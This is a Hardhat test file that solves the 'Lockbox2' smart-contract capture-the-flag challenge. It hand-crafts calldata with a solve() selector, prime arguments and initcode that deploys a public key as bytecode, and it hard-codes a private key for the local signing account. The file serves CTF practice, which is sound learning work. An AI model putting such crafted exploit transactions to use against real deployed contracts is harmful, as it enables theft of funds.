import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";


describe("[Challenge] Lockbox2", function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SetupFactory = await ethers.getContractFactory(
            "SetupLockbox2",
            deployer
        );
        this.challenge = await SetupFactory.deploy();

        expect(await this.challenge.isSolved()).to.equal(false);
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const Lockbox2LikeFactory = await ethers.getContractFactory(
            "Lockbox2Like",
            deployer
        );
        const lockbox2 = await Lockbox2LikeFactory.deploy();
        //account_pubkey
        account_pubkey = '0x00512e1544b18e466e9d0939c92b726757eeb87f6ca265be5e134a0dd64264c9d0fe416bfb86f5b9e8c15487ffa7fd9d31f23b64bec083d188a6a610b686ccc6' //gotten from scripts/pubkeyBytecode.py
        //account_pubkey
        account_privkey = '0xcf492f0f1e8c3d072ab465af22a1be2d01d095b2f592b6d0a81ba36493e22571'//gotten from scripts/pubkeyBytecode.py
        //const pKey = new ethers.Wallet.createRandom();
        //const signer = new ethers.Wallet(pKey, provider);
        const sender = new ethers.Wallet(account_privkey, ethers.provider)

        data =  "0x890d6908"                                                                // solve() function selector
        data += "0000000000000000000000000000000000000000000000000000000000000061"          // 97 (prime number)
        data += "00000000000000000000000000000000000000000000000000000000000001af"          // 431 (prime number)
        data += "0000000000000000000000000000000000000000000000000000000000000001"          // 1
        data += "000000000000000000000000000000000000000000000000000000000000000100"        // 1 (followed by two zeroes so that bytes in stage 4 isn't too long)
        data += `7f${account_pubkey.slice(0,64)}6000527f${account_pubkey.slice(64)}60205260406000f3`     // initcode to create contract with pub_key as bytecode
        data += Array(998 - data.length).fill(0).join('') 

        await deployer.sendTransaction({ to: sender.address, value: ethers.utils.parseEther('100') });
        await sender.sendTransaction({to: lockbox2.address, data})
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(await this.challenge.isSolved()).to.equal(true);
    });
});